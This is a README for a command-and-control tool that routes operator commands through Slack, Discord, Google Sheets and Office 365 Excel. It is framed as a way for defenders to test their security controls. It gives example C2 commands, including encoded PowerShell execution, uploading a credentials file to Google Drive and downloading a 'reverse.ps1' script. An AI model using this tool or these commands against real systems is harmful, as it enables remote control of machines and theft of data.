# SaaS-Squash Overview

<img src="https://raw.githubusercontent.com/TechRinger/media/main/images/SaaS-Squash.png" width="100%">

This is a collection of SaaS apps that can be used as C2 servers that have been used by threat actors in the past. This is not an exhaustive list, but will continue to add integrations as they are found. The main goal is on this app is to lower skill level required for defenders to be able to test their security controls against known C2 infrastructure.

This is designed to be as straight forward as possible and does not use any EDR or firewall bypass techniques when building/compiling the executable. This is to ensure that the payloads are as easy to detect as possible while trying to mimic the real world as techniques.

## Disclaimer

This is for educational purposes only. I am not responsible for any damage caused by the use of this tool. Please use responsibly.

## Current Integrations

1. [Slack](<https://slack.com/>)
2. [Google Sheets](<https://www.google.com/sheets>)
3. [Office 365 Excel](<https://www.office.com/>)
4. [Discord](<https://discord.com/>)

## To Do

- [X] Release the first version
- [X] Change Google Drive to use filename instead of file ID
- [ ] Get the Google Sheets HTTP3/QUIC working
- [ ] Get Slack Web API working (currently working with RTM)
- [ ] Add Pastebin, Gists, and other file sharing apps
- [ ] Add Telegram, Twitter, and other social media apps
- [ ] Add more Office 365 apps
- [ ] Add more Google apps
- [ ] More to come...

## Configuration

See Wiki for configuration details: <https://github.com/TechRinger/SaaS-Squash/wiki>

## How to use

Each time the app is launched it will create a 8 character hex UUID to let the endpoint know if the commands are meant for it to execute or not.  If the SaaS app has other ways to differentiate the clients (e.g. they each have a seperate speadsheet page) then the UUID isn't needed.  When it disocers a command it will check to see if it's base64 incoded, if so it will run it as a Powershell encoded command.  If it's not base64 encoded it will run it as a normal command.  The following commands are supported:

1. Discord, Slack example:  in the following example the client UUID is `60d45c81` and we want to tell the client to download the last attachment from the channel.  Following the UUID (space is opotional) you can enter the BOT UUID + COMMAND:  
   - Download example: `60d45c81 download`
   - Upload example of README.md: `60d45c81 download README.md`
   - Execute whois example: `60d45c81 whois`
   - Execute PowerShell encoded command example to get the public IP ((Invoke-WebRequest -URI https://icanhazip.com/).Content): `60d45c81 KABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAUgBJACAAaAB0AHQAcABzADoALwAvAGkAYwBhAG4AaABhAHoAaQBwAC4AYwBvAG0ALwApAC4AQwBvAG4AdABlAG4AdAA=`
1. O365 Excel, Google Sheets exapmle: both of these apps create spreadsheets to track endpoints connections so the UUID isn't needed.  Instead the command to get executed goes in Column A and the return value is in Column B.  These each use the designated file storage location to upload and download files (e.g. Google Drive, OneDrive, etc.)


| Example | Column A | Column B |
| -------- | -------- | -------- |
|Upload example   |upload;/etc/http3/credentials | File Uploaded to: https://drive.google.com/drive/u/0/folders/1C5C23sa8OeDqNNRc-OdjL4WcjVB4pFAPe|
|Google download (uses file ID) | download;1I80EO2PYK_-ahp7q_hsVQyjKmy23J67L;reverse.ps1|File Downloaded|
|O365 download (uses file name) | download;script.txt|File Downloaded|
| Cmd example         | whoami   | tim|
| Powershell encoded command Example | KABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAUgBJACAAaAB0AHQAcABzADoALwAvAGkAYwBhAG4AaABhAHoAaQBwAC4AYwBvAG0ALwApAC4AQwBvAG4AdABlAG4AdAA= | 52.123.5.2 |

## Donation

If you like what I've done and would like to donate, click the link below

[PayPal Donation](<https://www.paypal.com/donate/?hosted_button_id=VN9G973VD8HRA>)
